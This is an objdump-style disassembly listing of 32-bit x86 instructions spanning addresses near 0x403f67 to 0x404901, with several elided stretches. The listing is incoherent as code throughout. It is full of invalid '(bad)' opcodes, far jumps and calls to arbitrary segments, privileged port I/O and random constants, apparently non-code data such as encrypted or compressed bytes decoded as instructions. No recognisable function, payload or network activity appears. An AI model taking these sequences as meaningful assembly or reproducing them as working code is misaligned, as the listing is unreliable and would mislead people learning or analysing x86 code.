  403f67:	jmp    0x8e94:0x46ebdaba
  403f6e:	and    DWORD PTR [ecx-0xd],0xffffffd2
  403f72:	xchg   ebp,eax
  403f73:	mov    esp,0x3cdd874c
  403f78:	and    al,0xb8
  403f7a:	js     0x403f54
  403f7c:	or     cl,BYTE PTR [eax+eax*1]
  403f7f:	mov    dh,0x5c
  403f81:	mov    cl,0xe
  403f83:	push   ebx
  403f84:	ret    
  403f85:	add    eax,0x86d39566
  403f8a:	scas   eax,DWORD PTR es:[edi]
  403f8b:	jo     0x403ff9
  403f8d:	sbb    al,BYTE PTR [edi+0xe]
  403f90:	sbb    edi,DWORD PTR [edi+0x59]
  403f93:	jmp    0x403fc8
  403f95:	adc    esp,DWORD PTR [ecx+0x34c43ca2]
  403f9b:	aas    
  403f9c:	jecxz  0x403fdd
  403f9e:	mov    esp,0xcabd8419
  403fa3:	mov    ah,0xaa
  403fa5:	xor    DWORD PTR [edx],esp
  403fa7:	gs repz sbb DWORD PTR fs:[eax-0x35],eax
  403fad:	ja     0x403f81
  403faf:	ficomp WORD PTR [ebx]
  403fb1:	jmp    0x322c:0x6e02bbc3
  403fb8:	sti    
  403fb9:	xor    BYTE PTR [ecx+0x5195544f],ch
  403fbf:	test   eax,0xc43f28b2
  403fc4:	mov    eax,DWORD PTR [eax]
	...
  403fde:	mov    WORD PTR [edi+0x5f7f7b7a],?
  403fe4:	xlat   BYTE PTR ds:[ebx]
  403fe5:	mov    ds:0xf1001723,al
  403fea:	mov    bh,0x82
  403fec:	add    al,0x4c
  403fee:	dec    edi
  403fef:	lock mov ebx,0x219be70d
  403ff5:	sub    BYTE PTR [eax],bl
  403ff7:	pop    eax
  403ff8:	cdq    
  403ff9:	xchg   BYTE PTR [esi],bl
  403ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ffc:	mov    esp,DWORD PTR [ebx+0x23350c7]
  404002:	scas   al,BYTE PTR es:[edi]
  404003:	dec    ebx
  404004:	in     eax,dx
  404005:	pop    ds
  404006:	inc    ecx
  404007:	test   al,0x55
  404009:	jns    0x403ff0
  40400b:	push   esp
  40400c:	inc    edi
  40400d:	xchg   esp,eax
  40400e:	call   0x19563fb3
  404013:	jmp    0x404076
  404015:	lock mov ebp,0x608eda85
  40401b:	repz (bad) 
  40401d:	imul   esi,DWORD PTR [ebp+0x7f],0x70
  404021:	popf   
  404022:	test   DWORD PTR [edi+0x53983828],ebx
  404028:	nop
  404029:	push   ss
  40402a:	ds test eax,0x55e0b382
  404030:	cmp    ch,BYTE PTR [edx-0x30]
  404033:	jle    0x403fdc
  404035:	inc    edi
  404036:	adc    eax,0xb8e11ef2
  40403b:	xchg   BYTE PTR ds:0xb4eb4dbc,cl
  404041:	lea    eax,[eax]
	...
  40405b:	pop    eax
  40405c:	inc    esp
  40405d:	mov    ebp,0x5b07d28
  404062:	push   es
  404063:	sar    DWORD PTR [edi+edx*1],0xa3
  404067:	xor    eax,0xcd1aafb8
  40406c:	loop   0x40409f
  40406e:	ja     0x404050
  404070:	mov    cs,WORD PTR [edx-0x6825fa6f]
  404076:	in     al,dx
  404077:	test   al,0x95
  404079:	and    BYTE PTR [eax],al
  40407b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40407c:	jo     0x404072
  40407e:	js     0x4040bb
  404080:	and    ecx,DWORD PTR [eax-0x40]
  404083:	or     eax,0xb0d2fd09
  404088:	fild   DWORD PTR [eax+0x6a]
  40408b:	stc    
  40408c:	push   edx
  40408d:	xchg   esi,eax
  40408e:	not    esp
  404090:	cdq    
  404091:	sub    DWORD PTR [edi-0x3e],ecx
  404094:	mov    bl,BYTE PTR [edi+0x23711f5d]
  40409a:	in     eax,0x20
  40409c:	cli    
  40409d:	push   0x4d
  40409f:	mov    ebp,0x9bf5d6f2
  4040a4:	shl    DWORD PTR [edx-0x19],1
  4040a7:	ss sub bl,dh
  4040aa:	pop    edi
  4040ab:	iret   
  4040ac:	or     BYTE PTR [ecx],0xc2
  4040af:	and    cl,BYTE PTR [edx+0x3a447ab5]
  4040b5:	add    BYTE PTR [eax-0x57],ch
  4040b8:	mov    eax,ds:0xb887d0bb
  4040bd:	fimul  WORD PTR [eax+0x0]
	...
  4040d7:	add    BYTE PTR [edx+0x4f],bl
  4040da:	arpl   WORD PTR [eax],si
  4040dc:	in     al,dx
  4040dd:	pop    edi
  4040de:	(bad)  
  4040df:	and    dl,cl
  4040e1:	xchg   esi,eax
  4040e2:	push   0xffffff9a
  4040e4:	cwde   
  4040e5:	pop    ds
  4040e6:	mov    ebp,0x1c83507
  4040eb:	mov    edi,0xadb3e6e3
  4040f0:	jle    0x4040a1
  4040f2:	pop    es
  4040f3:	adc    eax,0x1d724717
  4040f8:	jmp    0x7b7e:0xbca5cdcf
  4040ff:	mov    bh,0x61
  404101:	addr16 (bad) 
  404103:	bswap  eax
  404105:	mov    edi,0x37259210
  40410a:	lods   al,BYTE PTR ds:[esi]
  40410b:	sub    dh,ah
  40410d:	pop    ebx
  40410e:	adc    bl,BYTE PTR [ecx]
  404110:	mov    esp,0x74a539be
  404115:	sub    DWORD PTR [ecx],ebp
  404117:	(bad)  
  404118:	dec    esp
  404119:	into   
  40411a:	add    bh,BYTE PTR [edx-0x2c]
  40411d:	mov    bl,0x61
  40411f:	iret   
  404120:	out    0x56,al
  404122:	mov    ebx,0xb3003e73
  404127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404128:	mov    ds:0x531899e2,eax
  40412d:	test   edx,ebp
  40412f:	lods   al,BYTE PTR ds:[esi]
  404130:	cmp    DWORD PTR [edx-0x6446eeaf],ecx
  404136:	mov    eax,ds:0x7b3ea24d
  40413b:	icebp  
	...
  404154:	add    BYTE PTR [edx],dh
  404156:	and    ecx,ebp
  404158:	inc    ebx
  404159:	cmp    dh,al
  40415b:	inc    edx
  40415c:	clc    
  40415d:	cwde   
  40415e:	in     al,dx
  40415f:	sub    ch,BYTE PTR [edi]
  404161:	or     eax,0xb59311d2
  404166:	ja     0x4041da
  404168:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40416a:	cmp    bl,cl
  40416c:	call   0x19a7:0xf9c994df
  404173:	bound  eax,QWORD PTR [ebp-0x11]
  404176:	inc    DWORD PTR [ecx]
  404178:	lock std 
  40417a:	mov    ds:0x63954c1a,al
  40417f:	push   edx
  404180:	fwait
  404181:	or     BYTE PTR [edi-0x7],al
  404184:	es js  0x40418f
  404187:	mov    edx,DWORD PTR [edx+0x2eb16d62]
  40418d:	loop   0x4041b3
  40418f:	push   0x54
  404191:	shr    cl,cl
  404193:	shr    al,1
  404195:	or     bh,0x32
  404198:	pop    ebp
  404199:	push   0xc8e11972
  40419e:	add    al,0x37
  4041a0:	loope  0x404163
  4041a2:	pop    ebp
  4041a3:	push   edx
  4041a4:	cmp    ch,BYTE PTR [esi+0x15]
  4041a7:	lods   al,BYTE PTR ds:[esi]
  4041a8:	test   eax,0x82c907bb
  4041ad:	ja     0x40421e
  4041af:	jg     0x404143
  4041b1:	push   esp
  4041b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b3:	fidivr DWORD PTR [ecx+0x49f44fc0]
	...
  4041d1:	add    BYTE PTR [ebp+0x3d],cl
  4041d4:	push   ecx
  4041d5:	icebp  
  4041d6:	test   al,0xb5
  4041d8:	or     BYTE PTR [esi],al
  4041da:	jbe    0x4041f4
  4041dc:	and    eax,0x83d10225
  4041e1:	mov    esi,0x5d9ec26f
  4041e6:	jmp    0x404212
  4041e8:	add    DWORD PTR [ebp-0x55],eax
  4041eb:	rcr    BYTE PTR [esi+eiz*8],cl
  4041ee:	sbb    bh,BYTE PTR ss:[edx+0x7d]
  4041f2:	mov    ds:0x3e9e9728,al
  4041f7:	rcl    BYTE PTR [esi],0xd6
  4041fa:	jmp    0x55b5354c
  4041ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404200:	lea    ecx,[esi]
  404202:	loopne 0x4041bb
  404204:	push   0x9e3e9c2d
  404209:	sbb    eax,0xfe3b16bf
  40420e:	push   0x5e
  404210:	adc    eax,0xb06cb665
  404215:	lds    edx,FWORD PTR [edx+0x4]
  404218:	imul   ebp,DWORD PTR [esi-0x72bb7663],0xf5e1e0e9
  404222:	pop    ebx
  404223:	repz mov esi,0x8e7b1054
  404229:	push   ss
  40422a:	adc    al,BYTE PTR [ebx-0x1441cad5]
  404230:	inc    DWORD PTR [edx+ebp*4]
  404233:	sbb    ch,BYTE PTR [eax+eiz*4]
	...
  40424e:	add    BYTE PTR [eax],ah
  404250:	(bad)  
  404251:	xchg   esp,eax
  404252:	sbb    DWORD PTR [ecx+0x1],esi
  404255:	or     DWORD PTR [edx+ebx*2+0x6d],esi
  404259:	mov    cl,0x92
  40425b:	mov    eax,0x51efa2f7
  404260:	jne    0x40427d
  404262:	mov    cl,0x59
  404264:	aam    0x43
  404266:	int3   
  404267:	mov    al,0x1a
  404269:	sti    
  40426a:	sub    ah,BYTE PTR [edx+0x6947e9ce]
  404270:	and    dl,BYTE PTR [ecx+0x6]
  404273:	test   eax,0x8263cc74
  404278:	stc    
  404279:	jae    0x4042f8
  40427b:	adc    BYTE PTR [esi+eiz*2-0x28],ch
  40427f:	stc    
  404280:	(bad)  
  404281:	fucomp st(1)
  404283:	test   DWORD PTR [eax+eax*1],0x95f4fb36
  40428a:	(bad)  
  40428b:	sbb    DWORD PTR ds:0x5510502c,esp
  404291:	mov    edx,0x19c0d4ee
  404296:	sbb    esi,ebx
  404298:	mov    al,0x8f
  40429a:	adc    dh,0x5f
  40429d:	xor    eax,0xa3901b6f
  4042a2:	idiv   DWORD PTR [esi-0x3bffcd84]
  4042a8:	ins    BYTE PTR es:[edi],dx
  4042a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042aa:	mov    DWORD PTR [ebx+ebx*4-0x345aa9e2],edi
  4042b1:	mov    al,dh
	...
  4042cb:	add    BYTE PTR [ecx+0x39],al
  4042ce:	sub    ebx,edi
  4042d0:	dec    eax
  4042d1:	sub    DWORD PTR [ebp+0x6d84f4e],edi
  4042d7:	jns    0x4042fb
  4042d9:	or     BYTE PTR [ecx+0x10329000],dl
  4042df:	fs (bad) 
  4042e1:	xor    eax,0x18def220
  4042e6:	jno    0x404330
  4042e8:	sbb    DWORD PTR [eax],ebx
  4042ea:	inc    ecx
  4042eb:	fdivrp st(7),st
  4042ed:	mov    esi,0xd4707dd4
  4042f2:	in     al,0xeb
  4042f4:	(bad)  
  4042f6:	mov    ch,0x51
  4042f8:	(bad)  
  4042fa:	test   edi,eax
  4042fc:	dec    esi
  4042fd:	or     DWORD PTR [eax-0x57f186aa],ebx
  404303:	shl    BYTE PTR [eax-0x1c],0xf8
  404307:	jp     0x4042e0
  404309:	fmul   st(0),st
  40430b:	in     al,dx
  40430c:	dec    ecx
  40430d:	push   es
  40430e:	pop    esp
  40430f:	dec    edi
  404310:	scas   al,BYTE PTR es:[edi]
  404311:	add    ch,BYTE PTR [ecx+ebx*8+0x27]
  404315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404316:	cmp    al,0x63
  404318:	shr    BYTE PTR [eax+0xaf6f50c],1
  40431e:	and    al,cl
  404320:	ror    DWORD PTR ds:0xe0785e10,1
  404326:	inc    eax
  404327:	in     al,0x7f
  404329:	fbstp  TBYTE PTR [eax+0x72]
  40432c:	adc    DWORD PTR [esp+eiz*8],eax
  40432f:	rol    DWORD PTR [eax],1
	...
  404349:	(bad)  
  40434a:	cld    
  40434b:	rol    DWORD PTR [edi+0x3f],cl
  40434e:	test   eax,0xab38fd84
  404353:	mov    ah,0x6b
  404355:	test   al,0x2f
  404357:	test   al,0xfa
  404359:	rdpmc  
  40435b:	cwde   
  40435c:	ins    BYTE PTR es:[edi],dx
  40435d:	xchg   BYTE PTR [esi],bl
  40435f:	leave  
  404360:	(bad)  
  404361:	adc    DWORD PTR ds:0xb8ef40f9,esi
  404367:	ins    BYTE PTR es:[edi],dx
  404368:	jecxz  0x404302
  40436a:	mov    ecx,0xf1f4755c
  40436f:	aad    0xd
  404371:	ret    
  404372:	adc    ebx,0x3d
  404375:	dec    ebp
  404376:	clc    
  404377:	retf   0x5030
  40437a:	(bad)  
  40437b:	int    0x0
  40437d:	fsubrp st(5),st
  40437f:	aam    0x51
  404381:	je     0x40439a
  404383:	aam    0x61
  404385:	loop   0x404343
  404387:	ja     0x40437d
  404389:	dec    ecx
  40438a:	jo     0x4043fc
  40438c:	(bad)  
  40438d:	xlat   BYTE PTR ds:[ebx]
  40438e:	fisubr WORD PTR [ecx-0x6b]
  404391:	lea    edx,[esi+0x6f]
  404394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404395:	sti    
  404396:	aad    0x1
  404398:	mov    eax,0x88068782
  40439d:	in     al,dx
  40439e:	xlat   BYTE PTR ds:[ebx]
  40439f:	(bad)  
  4043a0:	fadd   DWORD PTR [esi+0x10e8f8ed]
  4043a6:	nop    DWORD PTR [ebx+edi*2+0x46]
  4043ab:	sbb    al,0x4c
	...
  4043c5:	add    ch,ah
  4043c7:	pop    esp
  4043c8:	and    bl,BYTE PTR ds:0x2d25905f
  4043ce:	jmp    0x848213ba
  4043d3:	popf   
  4043d4:	enter  0xf271,0x55
  4043d8:	shl    DWORD PTR [eax],1
  4043da:	push   eax
  4043db:	addr16 (bad) 
  4043dd:	adc    dh,bl
  4043df:	or     al,0x73
  4043e1:	test   DWORD PTR [ebp-0x60],ebp
  4043e4:	jne    0x40439b
  4043e6:	fld    TBYTE PTR [esi]
  4043e8:	ins    BYTE PTR es:[edi],dx
  4043e9:	in     al,0x99
  4043eb:	test   DWORD PTR [ebx-0x2c],ebp
  4043ee:	daa    
  4043ef:	push   es
  4043f0:	add    eax,0x39696c9
  4043f5:	stc    
  4043f6:	and    BYTE PTR [eax-0x6],cl
  4043f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043fa:	cmp    BYTE PTR [ebp+edi*8-0x69],0xec
  4043ff:	add    al,0xe6
  404401:	sbb    ecx,esi
  404403:	imul   esi,ecx,0x1e
  404406:	stc    
  404407:	fnstenv [edi+0x27]
  40440a:	and    BYTE PTR [eax+0x6482047],dl
  404410:	rcr    BYTE PTR [eax],cl
  404412:	inc    ebp
  404413:	mov    cl,0xdd
  404415:	pop    ds
  404416:	adc    eax,0xc4266c23
  40441b:	int3   
  40441c:	cmp    esp,DWORD PTR [ecx]
  40441e:	hlt    
  40441f:	ss xchg ebp,eax
  404421:	add    eax,0x3029969
  404426:	push   ecx
  404427:	sub    ebp,DWORD PTR [ebx-0x5]
	...
  404442:	add    BYTE PTR [edi-0x3b],ah
  404445:	adc    al,0xfc
  404447:	aaa    
  404448:	dec    edi
  404449:	mov    WORD PTR [ebx+0x3d],?
  40444c:	mov    esi,0x544d74db
  404451:	bound  ebp,QWORD PTR [ebp-0x74]
  404454:	call   0xc94b:0x287c69ed
  40445b:	loope  0x404424
  40445d:	hlt    
  40445e:	int    0x9
  404460:	ds xlat BYTE PTR gs:[ebx]
  404463:	mov    al,0xb3
  404465:	rcl    al,cl
  404467:	mov    eax,0x95763421
  40446c:	dec    esp
  40446d:	add    esi,DWORD PTR [ecx-0x3b]
  404470:	mov    dh,0x8a
  404472:	push   0x6f9530f4
  404477:	les    esp,FWORD PTR [edx+0x4559cb33]
  40447d:	fmul   st(3),st
  40447f:	popa   
  404480:	iret   
  404481:	dec    ebp
  404482:	aad    0xb8
  404484:	sbb    BYTE PTR [edx+0x2aaae0d2],bh
  40448a:	sbb    eax,0x19b51bcd
  40448f:	mov    ebp,0x174400a9
  404494:	jge    0x4044dc
  404496:	xchg   ebx,eax
  404497:	adc    BYTE PTR [ebp-0x30],ch
  40449a:	lods   eax,DWORD PTR ds:[esi]
  40449b:	ret    
  40449c:	fnstenv [edx+0x1a]
  40449f:	repz pop es
  4044a1:	in     eax,0x83
  4044a3:	mov    dl,0x3a
  4044a5:	pop    edi
  4044a6:	sub    al,0x0
	...
  4044c0:	lods   eax,DWORD PTR ds:[esi]
  4044c1:	sub    cl,cl
  4044c3:	cdq    
  4044c4:	hlt    
  4044c5:	xor    edi,DWORD PTR [esi+eax*1]
  4044c8:	repnz inc ebx
  4044ca:	stos   BYTE PTR es:[edi],al
  4044cb:	ja     0x404460
  4044cd:	test   BYTE PTR [edi],0x20
  4044d0:	mov    WORD PTR [esi],es
  4044d2:	xchg   BYTE PTR [esi-0x36da9021],bh
  4044d8:	fidivr WORD PTR [edi-0x4d]
  4044db:	push   eax
  4044dc:	push   ss
  4044dd:	ror    DWORD PTR [ecx],1
  4044df:	pop    ds
  4044e0:	adc    DWORD PTR [ecx-0x53d25861],esp
  4044e6:	push   cs
  4044e7:	shr    BYTE PTR [eax],1
  4044e9:	mov    esp,0x8d283998
  4044ee:	and    ah,BYTE PTR [esi]
  4044f0:	daa    
  4044f1:	pop    ebp
  4044f2:	mov    ah,0x40
  4044f4:	retf   
  4044f5:	out    0x16,eax
  4044f7:	pinsrw mm6,edi,0x80
  4044fb:	sahf   
  4044fc:	pushf  
  4044fd:	dec    eax
  4044fe:	cmp    ebp,DWORD PTR [ecx-0x2b52e767]
  404504:	pop    DWORD PTR [ecx+0x718e6320]
  40450a:	mov    dh,0xea
  40450c:	test   DWORD PTR [edx-0x2d7ecaf4],esp
  404512:	call   0x217c:0x393e2493
  404519:	cs scas eax,DWORD PTR es:[edi]
  40451b:	in     eax,dx
  40451c:	ret    0x14de
  40451f:	sbb    bh,BYTE PTR [esi+ecx*1+0x83]
	...
  40453a:	add    BYTE PTR [eax],al
  40453c:	add    BYTE PTR [esi-0x22],ch
  40453f:	or     dl,BYTE PTR [edx]
  404541:	inc    ecx
  404542:	push   es
  404543:	cmp    eax,DWORD PTR [eax+ebx*8-0x38c195f4]
  40454a:	pop    es
  40454b:	pop    edx
  40454c:	test   al,0x31
  40454e:	lods   al,BYTE PTR ds:[esi]
  40454f:	into   
  404550:	or     edi,DWORD PTR [esi]
  404552:	test   eax,0x1979dfe
  404557:	scas   al,BYTE PTR es:[edi]
  404558:	daa    
  404559:	mov    eax,0xddb19e02
  40455e:	stos   BYTE PTR es:[edi],al
  40455f:	xchg   edx,eax
  404560:	inc    esp
  404561:	adc    ch,BYTE PTR [edx+0xabd2a2]
  404567:	repnz push 0xfec203b4
  40456d:	loop   0x40454e
  40456f:	push   esi
  404570:	pop    ebp
  404571:	or     eax,0x64cb66e5
  404576:	or     eax,0x6eb7136
  40457b:	push   es
  40457c:	out    0xfb,eax
  40457e:	mov    ch,0x1b
  404580:	jbe    0x404566
  404582:	into   
  404583:	sub    esp,eax
  404585:	sub    eax,0x725a7ab7
  40458a:	mov    esp,0x1954cc4a
  40458f:	fild   QWORD PTR [edi-0x35]
  404592:	sbb    ch,bh
  404594:	stc    
  404595:	xor    dh,BYTE PTR [esi+edi*4]
  404598:	inc    ebx
  404599:	mov    ebp,0x83d58e30
  40459e:	shl    BYTE PTR [ebx+0xe8],cl
	...
  4045b8:	add    BYTE PTR [eax],al
  4045ba:	ins    BYTE PTR es:[edi],dx
  4045bb:	rcl    DWORD PTR [ebx-0x3d46fa82],1
  4045c1:	(bad)  
  4045c2:	jmp    0x6717:0x3c52f2bb
  4045c9:	icebp  
  4045ca:	mov    bl,0x1c
  4045cc:	push   edi
  4045cd:	addr16 hlt 
  4045cf:	mov    edx,0xe6c9066e
  4045d4:	jne    0x40460c
  4045d6:	das    
  4045d7:	imul   WORD PTR [edx]
  4045da:	mov    esi,0x401afe53
  4045df:	fs add al,0x4a
  4045e2:	ret    0xffed
  4045e5:	jns    0x40463b
  4045e7:	dec    ebx
  4045e8:	and    al,0xef
  4045ea:	mov    bh,0x76
  4045ec:	and    edi,ebx
  4045ee:	dec    ecx
  4045ef:	std    
  4045f0:	sbb    DWORD PTR [esi-0x41e59365],ecx
  4045f6:	sbb    eax,0x68b322d7
  4045fb:	and    ah,BYTE PTR [edx]
  4045fd:	sub    esi,0x10
  404600:	sbb    edx,edx
  404602:	push   esp
  404603:	sbb    BYTE PTR [ebx],0xe2
  404606:	retf   0xf7d9
  404609:	jbe    0x40466c
  40460b:	daa    
  40460c:	std    
  40460d:	inc    esi
  40460e:	test   edi,0x59ad1605
  404614:	(bad)  
  404615:	and    eax,0x3b6df113
  40461a:	call   0x0:0xb66e0
	...
  404635:	add    BYTE PTR [eax],al
  404637:	sbb    al,0xc7
  404639:	outs   dx,DWORD PTR ds:[esi]
  40463a:	pop    edx
  40463b:	xchg   dx,ax
  40463d:	je     0x4046a9
  40463f:	clc    
  404640:	outs   dx,DWORD PTR ds:[esi]
  404641:	sar    bh,1
  404643:	xchg   ebx,eax
  404644:	jns    0x404619
  404646:	iret   
  404647:	in     eax,0x9
  404649:	retf   
  40464a:	sahf   
  40464b:	jg     0x404624
  40464d:	leave  
  40464e:	scas   al,BYTE PTR es:[edi]
  40464f:	add    DWORD PTR [edi],esp
  404651:	pop    ds
  404652:	ret    0xd264
  404655:	and    al,0xf2
  404657:	(bad)  
  404659:	sbb    eax,0x16b068a3
  40465e:	xchg   ebx,eax
  40465f:	out    dx,al
  404660:	add    al,0x85
  404662:	cli    
  404663:	icebp  
  404664:	ins    DWORD PTR es:[edi],dx
  404665:	xchg   edx,eax
  404666:	stc    
  404667:	sub    esp,esp
  404669:	sbb    al,BYTE PTR [ecx]
  40466b:	push   ebx
  40466c:	mov    ah,ah
  40466e:	add    ecx,DWORD PTR [ebx-0x8]
  404671:	pop    ebx
  404672:	push   0x6b8b872e
  404677:	dec    esi
  404678:	stc    
  404679:	icebp  
  40467a:	jb     0x40469b
  40467c:	jae    0x40465b
  40467e:	jno    0x40465f
  404680:	fdivr  QWORD PTR [edx-0x2b]
  404683:	push   0x7f
  404685:	inc    esp
  404686:	into   
  404687:	jb     0x40469a
  404689:	aad    0xc7
  40468b:	fwait
  40468c:	pop    ebx
  40468d:	loop   0x40465b
  40468f:	ret    
  404690:	in     eax,0x6e
  404692:	aam    0xc6
  404694:	mov    eax,0x4696cf38
  404699:	rol    esi,0x0
	...
  4046b4:	inc    edi
  4046b5:	pushf  
  4046b6:	into   
  4046b7:	int    0x77
  4046b9:	xor    ch,BYTE PTR [eax+0x69]
  4046bc:	loop   0x40468f
  4046be:	pop    ss
  4046bf:	push   0x1a
  4046c1:	inc    eax
  4046c2:	xchg   BYTE PTR [ebx-0x1d],dh
  4046c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c6:	icebp  
  4046c7:	jo     0x404684
  4046c9:	sbb    esi,DWORD PTR [ecx-0x5]
  4046cc:	mov    ebp,0xddf7feaa
  4046d1:	adc    al,0x8f
  4046d3:	add    DWORD PTR [edi],ecx
  4046d5:	iret   
  4046d6:	fadd   DWORD PTR [edx]
  4046d8:	out    dx,eax
  4046d9:	inc    eax
  4046da:	jbe    0x4046fd
  4046dc:	pop    edx
  4046dd:	mov    ds:0x2d6222e1,eax
  4046e2:	dec    eax
  4046e3:	sbb    ebp,DWORD PTR [ebx]
  4046e5:	mov    bh,0xf7
  4046e7:	pop    ss
  4046e8:	xor    ecx,DWORD PTR [ecx-0x77]
  4046eb:	cli    
  4046ec:	adc    eax,0x25f9961c
  4046f1:	mov    dl,0x0
  4046f3:	daa    
  4046f4:	hlt    
  4046f5:	xchg   DWORD PTR [eax+esi*8-0xa],edx
  4046f9:	push   edi
  4046fa:	ret    0xdb4e
  4046fd:	jmp    0x20f6:0xfb18b960
  404704:	or     DWORD PTR [edx+0x4d],ecx
  404707:	iret   
  404708:	or     DWORD PTR [edx],ebx
  40470a:	fist   DWORD PTR [edi-0x3f]
  40470d:	das    
  40470e:	dec    edx
  40470f:	mov    al,ds:0x29dc3fc2
  404714:	mov    bl,0xe
  404716:	data16 mov dh,0x0
	...
  404731:	scas   eax,DWORD PTR es:[edi]
  404732:	fsubp  st(7),st
  404734:	nop
  404735:	dec    esp
  404736:	jae    0x40478b
  404738:	aas    
  404739:	pop    ds
  40473a:	add    ebp,0xffffffae
  40473d:	and    eax,0x25197fd2
  404742:	mov    ds:0x970d84e9,al
  404747:	sbb    al,0x33
  404749:	push   ds
  40474a:	(bad)  
  40474b:	mov    bl,BYTE PTR [edx+0x5307606]
  404751:	add    al,0x66
  404753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404754:	arpl   WORD PTR [eax+0x432c04db],sp
  40475a:	or     edx,DWORD PTR [ebx+0x293a31bd]
  404760:	retf   0x2a30
  404763:	mov    edi,0x2e1efa3a
  404768:	and    eax,0x94b84f19
  40476d:	out    dx,eax
  40476e:	std    
  40476f:	add    ebx,eax
  404771:	jmp    0x3760:0x3e9d93ed
  404778:	stos   BYTE PTR es:[edi],al
  404779:	sub    edx,DWORD PTR [eax-0x3e0acc5f]
  40477f:	sbb    edi,esp
  404781:	cmc    
  404782:	mov    cl,0x8d
  404784:	add    BYTE PTR ds:0x14000006,cl
  40478a:	rdtsc  
  40478c:	inc    ecx
  40478d:	cmpxchg BYTE PTR [ecx-0x7e],ah
  404791:	idiv   BYTE PTR [ebx+0xc352]
	...
  4047ab:	add    BYTE PTR [eax],al
  4047ad:	add    cl,ch
  4047af:	cld    
  4047b0:	les    eax,FWORD PTR [eax+edx*1]
  4047b3:	repnz repz inc ebp
  4047b6:	sub    ecx,DWORD PTR [edi-0x59]
  4047b9:	xchg   BYTE PTR [edx],al
  4047bb:	dec    eax
  4047bc:	xchg   esi,eax
  4047bd:	(bad)  
  4047be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047bf:	ror    BYTE PTR [edx-0x443c93f8],1
  4047c5:	dec    ecx
  4047c6:	inc    edi
  4047c7:	jnp    0x4047b1
  4047c9:	mov    ch,BYTE PTR [esi+0x71]
  4047cc:	fxch   st(3)
  4047ce:	popa   
  4047cf:	adc    al,0x4f
  4047d1:	or     al,0x88
  4047d3:	aaa    
  4047d4:	jle    0x404823
  4047d6:	and    eax,DWORD PTR [edi-0x71e571d3]
  4047dc:	sbb    al,0xcf
  4047de:	addr16 ret 
  4047e0:	adc    dl,BYTE PTR [ecx+0x6e]
  4047e3:	shl    BYTE PTR [ebx],1
  4047e5:	adc    BYTE PTR [ebp+0x71],al
  4047e8:	jo     0x4047bd
  4047ea:	lods   al,BYTE PTR ds:[esi]
  4047eb:	jp     0x40482e
  4047ed:	xchg   edx,eax
  4047ee:	mov    ds:0x4a55d737,eax
  4047f3:	adc    al,0xe6
  4047f5:	adc    al,0x61
  4047f7:	lea    esi,[ebp-0x7b79a729]
  4047fd:	xchg   esi,eax
  4047fe:	iret   
  4047ff:	push   cs
  404800:	cwde   
  404801:	pop    ecx
  404802:	(bad)  
  404803:	add    eax,0xbd0d18a9
  404808:	stc    
  404809:	(bad)  [edi+ebp*4-0x10d46536]
  404810:	pop    esp
  404811:	pop    ebp
	...
  40482a:	add    BYTE PTR [edx-0x4],dl
  40482d:	imul   ebx,DWORD PTR [esp+esi*8],0x5f
  404831:	inc    ebx
  404832:	aas    
  404833:	inc    ebx
  404834:	or     BYTE PTR [edx+0xe],0x7a
  404838:	inc    eax
  404839:	and    BYTE PTR [esi+edx*2],0x2f
  40483d:	test   DWORD PTR ds:0x46729217,edx
  404843:	aam    0x31
  404845:	pop    ebx
  404846:	ja     0x4047dd
  404848:	jl     0x4047e6
  40484a:	loope  0x4047e6
  40484c:	jbe    0x4047ff
  40484e:	rcl    bl,1
  404850:	imul   eax,esi,0xffffff83
  404853:	sbb    BYTE PTR [edi+edi*4-0x4e],dl
  404857:	push   ecx
  404858:	jmp    0xeadef6a3
  40485d:	cmp    eax,0x1907df9f
  404862:	int3   
  404863:	or     al,0x98
  404865:	xor    edi,ebp
  404867:	dec    ebp
  404868:	in     eax,0xf2
  40486a:	push   0x62
  40486c:	push   cs
  40486d:	ficomp DWORD PTR [ecx-0x65]
  404870:	mov    ds:0x9bd008fc,eax
  404875:	pop    es
  404876:	cmp    BYTE PTR [ecx],cl
  404878:	out    0x3d,eax
  40487a:	ss xchg eax,ebp
  40487d:	inc    esi
  40487e:	pop    es
  40487f:	inc    esi
  404880:	dec    ecx
  404881:	xor    al,0x54
  404883:	add    eax,0xc46518da
  404888:	and    bl,dl
  40488a:	repnz imul ecx,DWORD PTR [ebx+esi*8-0x3f],0x0
	...
  4048a8:	mov    ds:0xe9910825,al
  4048ad:	sbb    eax,0xbf209ffd
  4048b2:	test   BYTE PTR [edi+ecx*2-0x71728050],bh
  4048b9:	rcr    DWORD PTR [edx-0x22],1
  4048bc:	mov    ebp,0xfcef7171
  4048c1:	add    al,0x5a
  4048c3:	mov    cl,0xad
  4048c5:	lahf   
  4048c6:	push   ebx
  4048c7:	pushf  
  4048c8:	mov    esp,0xffbf285e
  4048cd:	and    DWORD PTR [ecx],esi
  4048cf:	(bad)  
  4048d0:	into   
  4048d1:	loopne 0x40488b
  4048d3:	sub    al,bl
  4048d5:	or     eax,edx
  4048d7:	and    DWORD PTR [edx-0x2ecb54b8],ecx
  4048dd:	xchg   DWORD PTR [edx+0x7dc6d84f],edx
  4048e3:	push   cs
  4048e4:	jle    0x4048eb
  4048e6:	ins    BYTE PTR es:[edi],dx
  4048e7:	cmc    
  4048e8:	scas   al,BYTE PTR es:[edi]
  4048e9:	inc    esp
  4048ea:	dec    edi
  4048eb:	loopne 0x4048c8
  4048ed:	or     DWORD PTR [esi-0x15],0xffffffbc
  4048f1:	ret    0x63c1
  4048f4:	mov    ecx,0xc068c811
  4048f9:	push   eax
  4048fa:	jecxz  0x404889
  4048fc:	fwait
  4048fd:	(bad)  
  4048fe:	fidiv  DWORD PTR [esi+0x62]
  404901:	into   
